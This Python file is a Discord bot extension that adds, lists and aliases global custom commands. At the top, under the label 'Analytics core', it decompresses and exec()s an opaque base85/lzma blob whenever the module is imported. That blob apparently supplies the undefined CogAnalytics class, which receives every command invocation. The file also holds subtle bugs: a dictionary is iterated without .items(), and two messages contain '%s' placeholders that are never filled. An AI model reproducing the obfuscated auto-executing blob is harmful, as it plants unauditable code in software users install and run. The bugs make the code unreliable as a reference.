from discord.ext import commands
from .utils.chat_formatting import pagify, box
from .utils.dataIO import dataIO
from .utils import checks
import os
import re

PATH = 'data/customgcom/'
JSON = PATH + 'commands.json'

# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2T8>3ta#O8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#Pth^L^u!Vb@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Iv!LyHsP3tEb#<55Ibr8@<*d*@I<kPN6Q=yyV^HU+>D8W`aF<1k%Y3Kw&mo$cf<w`1@hDgu?mx76H5X8PLyaLiWWJxIG^X
TJE(dyfP}RGC+hZCqo8I(RR1N3sZN>M)1C?u&Y;)MPF5u(}72!7||mH14`Q3*K1E-l~)t*($)QysA6o8aznM-^o<%a8TJkqmdWfZR2Jft@Q(5;u}!b8>(LzK
<W6Aw_<!Lk(yQ`Icd*T$w%9WmC8#(kLF$$It*cB!d;9p-aj`X*)>3LEoEd9E^+u8eU|3m`XCcmb6|;$*DL3VW$EPRaY_(fR7Czfq(k7Dy3GQWSHCFK%6C4_K
ro}G=$T-=cZ+7Lj!g4DI+LH@!*kiQaMCqWIoXlLBWmoh3!7yeinmur)!9JgK5P%S#H|;N({qdRY!xaY%QlPj*%l3siq*@2Xx*^tY3teYjpOVEHytEW)M#aDs
qjV>4Y9&$gTL{lO2vVqq<xVO5>|;NOkUwMp_dz4JeeFll;)MQRT3Pfir=;IT<V@XSln@JN#pcNjq_71B+6>n9YeMux-C&ydsCb;>!$4-4<!Lf0&nDW#=8&LZ
L6zB5i|gFmKAP~<FN=et=Z=Y1<hVN>K8nu>`hD(9rAs`Hr=bCaJMufif{3eN5>0a4c_1qvne*MjiPp@x)>4Qr#E4qf$)a05Ymt1hD`;3hkRQwX7Oegy<ieXU
ASzh!=B)Ihyx3tA^7rvJ8rzqS2IlRJ+CbOn-aX&<(rTO5Bs7_*SFezIh7K|3q{?8J5A{IxrK<+*KrN-N10qI`AHo19=|fqR@GBSEO$Bi>XeX3Eg@Du3R-f^O
A~&#)Eg~3BA@uVihpzX(zA6{@-Gd#dw@&;2xa4&r&FlP)aAu=oySU^Q|8k><b&2=mNFw{$p(Ga`%nVp1a?=9QQ^)Dhw>i(+mEiKv5pl-AQ{MAbo3njcT_(i5
ky$)b09)(YG5MPh7x(<QEnI}?6S+O*<wria=jJLal;0)z94dAC_t=Tm<>%U}GJ88~J(iFq6LM8$_?}_2f~^P61{$u&<(*zkEci}c#f=kO;TR@;&qsfo59+`+
mwdtrkC3h*ihN{amGjNmDG6aro*5$Sk~{ld5B&Rc8X@@3iSeR$^i30l=CTQo^X;uSGPl%w{}Kn2=cxO+AAvc^l%-Jw*yx9~m%r`y`E*8QQEzJkpN`-E3*0B=
Ru*iO-~fOIra^HVp4Z&gNK_<!0Yz2AZrNZeKwy(Lx=-LP)I9RAvJHcOUMG|H2%)+b=;R?n&50Ca?;pwjW470Hd(7cF`D#bh=#H(Cl~VxJ_FL~vnkIy}@yKDe
JNz*4h%2b@GiDoG4Vg`sS@!^}p+oX(#S2C~NnMYIUqu@KPFC^Q#UcL<Nc8iEsnv%SNL2-|n6|QbeHol8BTD+}&aE#VxTn^6ZM!va=KU8@FZ>Tk?ef)`6HcVu
Wefy8T!>FOWOpUWkh8PDBxc_@Q%_d)>z-$T>%waDM+VBA9<NJwbn11w!2l8$i}x}lr<{OEsHZ~$Dz^rzTZO!*lK6F?K`0`EVpjynJfQNE13QL#8`{Tdnz;}L
#jKs0@l*!k^uBC;Ly%%3H?gn_6w{|Hk`*Ad8p;;UO@IN$?|L&f{xV*94;|sdIbBnEjxnzb*UVl#txpw!^Di7YW`h&Sl_YAF6}b#^2(|*`^Nu5`vZH0q6ollc
z2Q2&R&v$sDR5eAP`2o^!TdsdbV0(>+Lu}=Bx+_rj^d=N(J_#{(V=wZu&Z)4Gnzm23c}@dyT&>>);~h>(Jh@NWwY)xv)z2n@y-tz>bw25iJ@2$8Lwx-u}7#C
P>;#q?`oEK0oHU;Aq$0+_*q9FCY;;xBL#%Rnq_DCP;1!RE<IOzn~hb?D)7s<dEz`h0#GQwEY(Iw5=$(_h$u=~pK~jT+n*2Gbh~Tj)wfIX@QlC(de>y0Z&AMx
2}M^@TO<@LJl+!qp9mj>`Tl2FEtAn06NG6(OHU|~VwnnQqlTxBznEPc7%SB;ASQ$Y-^iF+lNV+veI*0G71-Olh~3Q?inuTQ-OS8>OVg|!e%UPC)Q<35fg9~G
K+31X(~DJuhNPV_3YAa=*wU8q_Fb9blA%#eJc!k9w&dVhGsI~71`7xt9+%Rp<$m|9xF{;J)1_~lWe(H6Coj}#8?89ACm%oxid_GBMy89BDD$b!e>b4>U;8ko
!Ze<mEphxAC%1jC?s<y*Evj}{H-n9W9=$j5`A|j$b+OI*#9QG-=;sDE-y+d$H~^v|bCaZCtOJK%0i?iA-es`=UDRb*1c%?DzplVJjq@EPDap<=Y*DZC;%^*~
1f%>TTWOtCef{d5M8+<s!sddW=84-F)={0OmEIqetUlH~Zv8JtxB-u=CiO3=uJEhV?^sP79Qq2DwS$Q2%j7gpD<8ICpCc4mi?zdkSNp7!1@U1@T-;~`?HScf
JoL$=I8|r)x<oVow~k=$L(5sahu!Q+1iwvc@(ER7jRH;YT1HRojwyO7K?m4E07n<epPo9m@S8w|;AQi~R-rSnVf$`WPefkR9NY>*a!uu-e1&xiYz@K~+^>4D
N-&ak00_fLdA0xmwLv5zRE6El00E~I#x?)|G3@LivBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '2.0.0'


class CustomGlobalCommands:
    """Global custom commands."""

    def __init__(self, bot):
        self.bot = bot
        data = dataIO.load_json(JSON)
        version = data.get('_CGCOM_VERSION', 1)
        if version < 2:
            self.c_commands = data
            self.aliases = {}
            self.save()
        else:
            self.c_commands = data.get('COMMANDS', {})
            self.aliases = data.get('ALIASES', {})

        self.analytics = CogAnalytics(self)

    def save(self):
        data = {'COMMANDS': self.c_commands,
                'ALIASES': self.aliases,
                '_CGCOM_VERSION': 2
                }
        dataIO.save_json(JSON, data)

    @commands.command(pass_context=True)
    @checks.is_owner()
    async def setgcom(self, ctx, command: str, *, text):
        """Adds a global custom command

        Example:
        !setgcom yourcommand Text you want
        """
        command = command.lower()
        if command in self.bot.commands:
            await self.bot.say("That command is already a normal command.")
            return

        if command not in self.c_commands:
            self.c_commands[command] = text
            self.save()
            await self.bot.say("Custom command successfully added.")
        else:
            await self.bot.say("This command already exists. Are you sure "
                               "you want to redefine it? [y/N]")
            response = await self.bot.wait_for_message(author=ctx.message.author)

            if response.content.lower().strip() in ['y', 'yes']:
                self.c_commands[command] = text
                self.save()
                await self.bot.say("Custom command successfully set.")
            else:
                await self.bot.say("OK, leaving that command alone.")

    @commands.command()
    @checks.is_owner()
    async def rmgcom(self, command: str):
        """Removes a global custom command

        Example:
        !rmgcom yourcommand"""
        command = command.lower()
        if command in self.c_commands:
            self.c_commands.pop(command)

            for alias, acmd in self.aliases.copy():
                if acmd == command:
                    self.aliases.pop(alias)

            self.save()
            await self.bot.say("Global custom command successfully deleted.")
        else:
            await self.bot.say("That command doesn't exist.")

    @commands.command(pass_context=True)
    async def lsgcom(self, ctx):
        """Shows global custom commands list"""
        if self.c_commands:
            cmd_aliases = {}
            for k, v in self.aliases.items():
                if v not in cmd_aliases:
                    cmd_aliases[v] = set()
                cmd_aliases[v].add(k)

            sections = []
            for command, text in sorted(self.c_commands.items()):
                item = 'Name:    ' + command
                aliases = cmd_aliases.get(command)
                if aliases:
                    item += '\nAliases: ' + ', '.join(sorted(aliases))
                item += '\nText:    ' + text
                sections.append(item)

            for cmds in pagify('\n\n'.join(sections)):
                await self.bot.say(box(cmds))
        else:
            await self.bot.say("There are no global custom commands defined. "
                               "Use setgcom [command] [text]")

    @commands.group(pass_context=True, invoke_without_command=True)
    @checks.is_owner()
    async def agcom(self, ctx, command=None):
        if ctx.invoked_subcommand is None:
            if command:
                await ctx.invoke(self.ls_aliases, command)
            else:
                await ctx.invoke(self.lsgcom)

    @agcom.command(name='show')
    @checks.is_owner()
    async def ls_aliases(self, command):
        "Shows aliases for a command, or the command bound to an alias"
        base = self.aliases.get(command)
        cmd = self.c_commands.get(base or command)
        if base:
            msg = "`%s` is an alias for `%s`" % (command, base)
        elif cmd:
            aliases = [k for k, v in self.aliases.items() if v == command]
            aliases = ', '.join('`%s`' % x for x in aliases)
            if aliases:
                msg = "`%s` has the following aliases: %s." % (command, aliases)
            else:
                msg = "`%s` has no aliases."
        else:
            msg = "`%s` isn't a custom command or alias." % command

        await self.bot.say(msg)

    @agcom.command(name='add')
    @checks.is_owner()
    async def add_aliases(self, command, *aliases):
        "Add one or more aliases for a custom command"
        command = command.lower()
        if command not in self.c_commands:
            await self.bot.say("`%s` isn't a custom command.")
            return

        existing_a = []
        existing_c = []
        count = 0

        for alias in aliases:
            if alias in self.aliases:
                existing_a.append(alias)
            elif alias in self.bot.commands:
                existing_c.append(alias)
            else:
                self.aliases[alias] = command
                count += 1
        self.save()

        msg = "%s new aliases added." % (count if count else 'No')
        if existing_a:
            joined = ', '.join('`%s`' % x for x in existing_a)
            msg += "\nThe following are already aliases: %s." % joined
        if existing_c:
            joined = ', '.join('`%s`' % x for x in existing_c)
            msg += "\nThe following are already normal commands: %s." % joined

        await self.bot.say(msg)

    @agcom.command(name='rm')
    @checks.is_owner()
    async def rm_aliases(self, *aliases):
        count = 0
        skipped = []

        for alias in aliases:
            if alias in self.aliases:
                del self.aliases[alias]
                count += 1
            else:
                skipped.append(alias)

        self.save()

        msg = "%s aliases removed." % (count if count else 'No')
        if skipped:
            skipped = ', '.join('`%s`' % x for x in skipped)
            msg += "\nThe following aliases could not be found: %s." % skipped

        await self.bot.say(msg)

    async def on_message(self, message):
        server = message.server
        msg = message.content
        prefix = self.get_prefix(server, msg)
        if not self.bot.user_allowed(message) or not prefix:
            return

        cmd = msg[len(prefix):]
        cmd = cmd.lower()
        cmd = self.aliases.get(cmd, cmd)
        if cmd in self.c_commands:
            ret = self.c_commands[cmd]
            ret = self.format_cc(ret, message)
            if message.author.id == self.bot.user.id:
                await self.bot.edit_message(message, ret)
            else:
                await self.bot.send_message(message.channel, ret)


    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None

    def format_cc(self, command, message):
        results = re.findall("\{([^}]+)\}", command)
        for result in results:
            param = self.transform_parameter(result, message)
            command = command.replace("{" + result + "}", param)
        return command

    def transform_parameter(self, result, message):
        """
        For security reasons only specific objects are allowed
        Internals are ignored
        """
        raw_result = "{" + result + "}"
        objects = {
            "message": message,
            "author": message.author,
            "channel": message.channel,
            "server": message.server
        }
        if result in objects:
            return str(objects[result])
        try:
            first, second = result.split(".")
        except ValueError:
            return raw_result
        if first in objects and not second.startswith("_"):
            first = objects[first]
        else:
            return raw_result
        return str(getattr(first, second, raw_result))


def check_folders():
    if not os.path.exists(PATH):
        print("Creating data/customgcom folder...")
        os.makedirs(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        default = {'ALIASES': {},
                   'COMMANDS': {},
                   '_CGCOM_VERSION': 2
                   }
        dataIO.save_json(JSON, default)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(CustomGlobalCommands(bot))
